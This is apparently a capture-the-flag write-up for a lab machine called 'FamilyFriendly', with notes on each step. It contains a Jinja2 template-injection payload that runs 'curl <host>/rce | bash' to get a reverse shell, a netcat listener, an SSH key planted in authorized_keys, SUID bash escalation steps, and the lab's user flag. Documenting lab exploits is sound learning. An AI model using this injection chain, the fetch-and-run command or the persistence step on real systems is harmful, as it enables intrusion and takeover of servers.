# FamilyFriendly

## Enumeration
```bash
└─$ nmap -A -p- -sC -T4 10.10.205.16 -oX nmap.out                    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 14:25 BST
Nmap scan report for 10.10.205.16
Host is up (0.036s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
7/tcp  open  echo
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9e:30:c5:61:92:84:1b:24:64:86:c3:3b:b7:dc:99:34 (RSA)
|   256 78:c3:c3:83:81:73:cb:f1:50:41:f1:9a:d7:bf:3e:d1 (ECDSA)
|_  256 ec:ce:b8:f9:57:53:56:63:e9:61:90:12:15:e5:78:4a (ED25519)
23/tcp open  telnet  Linux telnetd
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
48151/tcp open  http    Werkzeug httpd 2.0.3 (Python 3.6.9)
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was http://10.10.34.139:48151/login
|_http-server-header: Werkzeug/2.0.3 Python/3.6.9
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.09 seconds

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

└─$ telnet <IP> 23 
```
### I found a secret path with fuff
```bash
http://10.10.101.61:48151/temporary/dev/new/account
```
### I create a user with the following password and when I connect, the password gives me a reverse shell.
```js
username = {{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl 10.8.37.214/rce | bash")|attr("read")()}}
```
```bash
python3 -m http.server 80

nc -lnvp 4444
```
## User FLAG

```cat /home/deadpool/user.txt``` : EPI{R_j00_5UR3_j00R3_n07_pHR0M_7H3_Dc_UN1V3r23}

## Privilege Escalation

```bash
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEVHSInmKKk3Z3UHbvtH9LHOnWkDTnKFtoPTRMI2+J+a mariusmarolleau@gmail.com" > authorized_keys
```

### linpeas gives me a vulnerability
cd /etc/logstash/conf.d

### modifie the file in this directory to get a bash with a suid in deadpool's home

```bash
cd /home/deadpool
./bash -p
```
### Got a shell as root

## Root FLAG

I forgot to write it :(